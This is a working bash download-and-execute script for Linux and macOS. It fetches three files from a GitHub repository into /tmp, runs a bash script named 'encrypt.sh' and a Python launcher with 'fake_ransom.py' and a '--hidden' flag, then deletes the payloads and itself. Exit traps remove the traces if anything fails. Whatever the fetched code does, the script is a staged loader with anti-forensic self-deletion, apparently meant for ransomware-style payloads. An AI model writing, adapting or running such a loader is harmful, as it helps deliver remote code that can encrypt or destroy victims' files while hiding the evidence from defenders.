#!/usr/bin/env bash
# mac-linux.sh
# Downloads 3 files from GitHub into /tmp, runs file1 (bash), deletes it,
# then runs: python3 FILE2 FILE3 [ARG], deletes both, then deletes itself.
# Works on any Linux distro + latest macOS.

# ============================================================
#  CONFIGURATION  — edit only this block
# ============================================================
FILE1="encrypt.sh"            # bash script
FILE2="auto.py"            # python script
FILE3="fake_ransom.py"              # python script (passed as arg to FILE2)
ARG="--hidden"             # leave "" for no arg

GITHUB_USER="rahul-call"   # GitHub user or org
REPO="inner"               # repo name
SUBFOLDER="ror"            # leave "" for no subfolder
# ============================================================

# --- re-exec under bash if launched via `sh` ---
if [ -z "${BASH_VERSION:-}" ]; then
    exec bash "$0" "$@"
fi
set -euo pipefail

# --- resolve script path (and skip self-delete if piped via stdin) ---
case "$(basename "$0" 2>/dev/null || true)" in
    ""|bash|sh|dash|zsh|ksh)
        SCRIPT_PATH="" ;;
    *)
        SCRIPT_PATH="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")" ;;
esac

# --- normalize config ---
ARG="${ARG:-}"
SUBFOLDER="${SUBFOLDER:-}"
SUBFOLDER="${SUBFOLDER#/}"
SUBFOLDER="${SUBFOLDER%/}"
if [ -n "$SUBFOLDER" ]; then SUBFOLDER_PATH="/${SUBFOLDER}"; else SUBFOLDER_PATH=""; fi

# --- validate config ---
for var_name in FILE1 FILE2 FILE3 GITHUB_USER REPO; do
    eval "val=\${$var_name}"
    [ -n "$val" ] || { echo "ERROR: $var_name is empty" >&2; exit 1; }
done
for f in "$FILE1" "$FILE2" "$FILE3"; do
    case "$f" in
        */*)      echo "ERROR: filename '$f' must not contain '/'" >&2; exit 1 ;;
        *[[:space:]]*) echo "ERROR: filename '$f' must not contain whitespace" >&2; exit 1 ;;
    esac
done
case "$SUBFOLDER" in
    *[[:space:]]*) echo "ERROR: SUBFOLDER must not contain whitespace" >&2; exit 1 ;;
esac

# --- environment checks ---
[ -d /tmp ] || { echo "ERROR: /tmp does not exist" >&2; exit 1; }
[ -w /tmp ] || { echo "ERROR: /tmp is not writable" >&2; exit 1; }
command -v curl    >/dev/null 2>&1 || { echo "ERROR: curl not found"    >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "ERROR: python3 not found" >&2; exit 1; }

# --- cleanup safety net (fires on any exit, including errors) ---
CREATED_FILES=""
register_file() { CREATED_FILES="${CREATED_FILES} $1"; }
cleanup() {
    local f
    for f in $CREATED_FILES; do
        rm -f -- "$f" 2>/dev/null || true
    done
}
trap cleanup EXIT

# --- download helper (main → master fallback, cleans partials on failure) ---
download() {
    local file="$1" dest="/tmp/$1" branch url
    # Register BEFORE download so a partial file from a failed transfer
    # gets cleaned up by the trap even if both branches fail.
    register_file "$dest"
    for branch in main master; do
        url="https://raw.githubusercontent.com/${GITHUB_USER}/${REPO}/${branch}${SUBFOLDER_PATH}/${file}"
        echo "==> Downloading ${file} (${branch})..."
        if curl -fsSL --retry 2 --retry-delay 2 --connect-timeout 10 \
                "$url" -o "$dest"; then
            return 0
        fi
    done
    echo "ERROR: could not download '${file}' from GitHub" >&2
    return 1
}

# --- 1. download all three ---
download "$FILE1"
download "$FILE2"
download "$FILE3"

cd /tmp

# --- 2. run file1 (bash), then delete it ---
echo "==> Running bash ${FILE1}"
bash "${FILE1}"

echo "==> Deleting ${FILE1}"
rm -f -- "${FILE1}"

# --- 3. run python FILE2 FILE3 [ARG], then delete both ---
if [ -n "$ARG" ]; then
    echo "==> Running: python3 ${FILE2} ${FILE3} ${ARG}"
    # Subshell + set -f so $ARG is word-split but NOT glob-expanded
    ( set -f; python3 "${FILE2}" "${FILE3}" $ARG )
else
    echo "==> Running: python3 ${FILE2} ${FILE3}"
    python3 "${FILE2}" "${FILE3}"
fi

echo "==> Deleting ${FILE2} and ${FILE3}"
rm -f -- "${FILE2}" "${FILE3}"

# --- 4. delete self (only if we actually know where we are) ---
if [ -n "$SCRIPT_PATH" ] && [ -f "$SCRIPT_PATH" ]; then
    echo "==> Deleting self: ${SCRIPT_PATH}"
    rm -f -- "$SCRIPT_PATH" || echo "WARNING: could not delete ${SCRIPT_PATH}" >&2
else
    echo "WARNING: skipping self-delete (script path unknown or not a regular file)" >&2
fi

echo "==> Done."
